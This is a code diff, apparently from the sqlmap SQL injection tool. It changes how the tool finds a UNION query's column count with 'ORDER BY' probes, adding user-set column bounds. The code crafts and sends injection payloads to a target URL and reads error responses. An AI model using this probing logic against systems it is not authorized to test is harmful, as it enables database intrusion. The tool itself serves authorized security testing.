@@ -48,7 +48,7 @@ def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=
     """
     retVal = None
 
-    def _orderByTechnique():
+    def _orderByTechnique(lowerCount, upperCount):
         def _orderByTest(cols):
             query = agent.prefixQuery("ORDER BY %d" % cols, prefix=prefix)
             query = agent.suffixQuery(query, suffix=suffix, comment=comment)
@@ -56,7 +56,7 @@ def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=
             page, headers, code = Request.queryPage(payload, place=place, content=True, raise404=False)
             return not any(re.search(_, page or "", re.I) and not re.search(_, kb.pageTemplate or "", re.I) for _ in ("(warning|error):", "order by", "unknown column", "failed")) and comparison(page, headers, code) or re.search(r"data types cannot be compared or sorted", page or "", re.I)
 
-        if _orderByTest(1) and not _orderByTest(randomInt()):
+        if _orderByTest(1 if lowerCount is None else lowerCount) and not _orderByTest(randomInt() if upperCount is None else upperCount + 1):
             infoMsg = "'ORDER BY' technique appears to be usable. "
             infoMsg += "This should reduce the time needed "
             infoMsg += "to find the right number "
@@ -64,10 +64,10 @@ def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=
             infoMsg += "range for current UNION query injection technique test"
             singleTimeLogMessage(infoMsg)
 
-            lowCols, highCols = 1, ORDER_BY_STEP
+            lowCols, highCols = 1 if lowerCount is None else lowerCount, ORDER_BY_STEP if upperCount is None else upperCount
             found = None
             while not found:
-                if _orderByTest(highCols):
+                if not conf.uCols and _orderByTest(highCols):
                     lowCols = highCols
                     highCols += ORDER_BY_STEP
                 else:
@@ -88,8 +88,8 @@ def _findUnionCharCount(comment, place, parameter, value, prefix, suffix, where=
         kb.errorIsNone = False
         lowerCount, upperCount = conf.uColsStart, conf.uColsStop
 
-        if lowerCount == 1:
-            found = kb.orderByColumns or _orderByTechnique()
+        if lowerCount == 1 or conf.uCols:
+            found = kb.orderByColumns or _orderByTechnique(lowerCount, upperCount)
             if found:
                 kb.orderByColumns = found
                 infoMsg = "target URL appears to have %d column%s in query" % (found, 's' if found > 1 else "")
